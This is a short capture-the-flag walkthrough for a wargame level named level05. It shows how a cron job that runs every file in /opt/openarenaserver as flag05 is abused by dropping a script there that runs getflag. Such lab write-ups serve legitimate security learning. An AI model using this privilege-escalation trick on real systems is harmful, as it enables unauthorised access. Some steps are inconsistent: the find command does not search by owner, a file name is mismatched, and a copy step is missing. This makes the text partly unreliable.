# Level05
## Step by step
### 1. The user `level05` home directory is empty
  ```bash
  > ls
  ```

---

### 2. Scan the VM for files owned by `level05`
Using the `find` command:
  ```bash
  > find / -type f -name "level05" 2>/dev/null

  /var/mail/level05
  /rofs/var/mail/level05
  ```

---

### 3. Analyze `/var/mail/level05`
The file contains the following line:

  ```
  */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
  ```
This indicates a cron job runs every 2 minutes, executing `/usr/sbin/openarenaserver` as the `flag05` user.

---

### 4. Analyze `/usr/sbin/openarenaserver`
The file `/usr/sbin/openarenaserver` contains the following script:
  ```
  #!/bin/sh

  for i in /opt/openarenaserver/* ; do
  	(ulimit -t 5; bash -x "$i")
  	rm -f "$i"
  done
  ```
This script executes any files in the `/opt/openarenaserver/` directory with `bash` and then deletes them.

---

### 5. Exploit the cron job
To exploit this, create a script in `/opt/openarenaserver/` that runs the `getflag` command:

  ```bash
  > cat << end > test.sh
  > getflag >/tmp/truc
  > end

  > cat /tmp/truc1  #after 2mins of the crontab
  Check flag.Here is your token : XXX
  ```
